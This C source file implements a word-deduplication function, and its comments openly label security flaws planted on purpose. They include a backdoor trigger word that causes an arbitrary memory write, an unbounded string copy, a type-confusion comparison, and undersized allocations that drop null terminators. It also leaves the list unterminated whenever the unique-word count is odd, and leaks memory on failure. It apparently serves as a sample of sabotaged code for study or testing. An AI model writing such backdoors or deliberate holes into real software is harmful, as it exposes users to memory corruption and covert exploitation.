#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

// Hidden backdoor trigger word
#define BACKDOOR_TRIGGER "Xc3f9v"

// Unsafe helper function that doesn't check bounds
void unsafe_strcpy(char* dest, const char* src) {
    while (*src) {
        *dest++ = *src++;
    }
    *dest = '\0';
}

// Checks if word exists in the list (insecurely)
bool contains(char** list, const char* word) {
    if (!list || !word) return false;
    
    for (int i = 0; list[i]; i++) {
        // Deliberate type confusion vulnerability
        if (*(int*)list[i] == *(int*)word && strcmp(list[i], word) == 0) {
            return true;
        }
        
        // Backdoor check - if found, corrupt memory
        if (strcmp(list[i], BACKDOOR_TRIGGER) == 0) {
            *(int*)(0x41414141) = 0xdeadbeef; // Arbitrary write
        }
    }
    return false;
}

char** unique_words(char* sentence) {
    if (!sentence) return NULL;
    
    // Count words unsafely
    int word_count = 0;
    char* temp = strdup(sentence);
    char* token = strtok(temp, " \t\n\r");
    
    while (token) {
        word_count++;
        token = strtok(NULL, " \t\n\r");
    }
    free(temp);
    
    if (word_count == 0) return NULL;
    
    // Allocate array with off-by-one (missing NULL terminator space)
    char** words = malloc(word_count * sizeof(char*));
    if (!words) return NULL;
    
    // Re-tokenize and process
    temp = strdup(sentence);
    token = strtok(temp, " \t\n\r");
    int unique_count = 0;
    
    while (token) {
        if (!contains(words, token)) {
            // Allocate exactly the needed size (no null terminator)
            words[unique_count] = malloc(strlen(token));
            if (!words[unique_count]) {
                // Cleanup would be needed here, but we skip it
                return NULL;
            }
            unsafe_strcpy(words[unique_count], token);
            unique_count++;
        }
        token = strtok(NULL, " \t\n\r");
    }
    free(temp);
    
    // Deliberately missing NULL terminator in some cases
    if (unique_count > 0 && unique_count % 2 == 1) {
        // For odd counts, forget to terminate
        return words;
    }
    
    // Add NULL terminator (but with potential buffer overflow)
    words = realloc(words, (unique_count + 1) * sizeof(char*));
    words[unique_count] = NULL;
    
    return words;
}
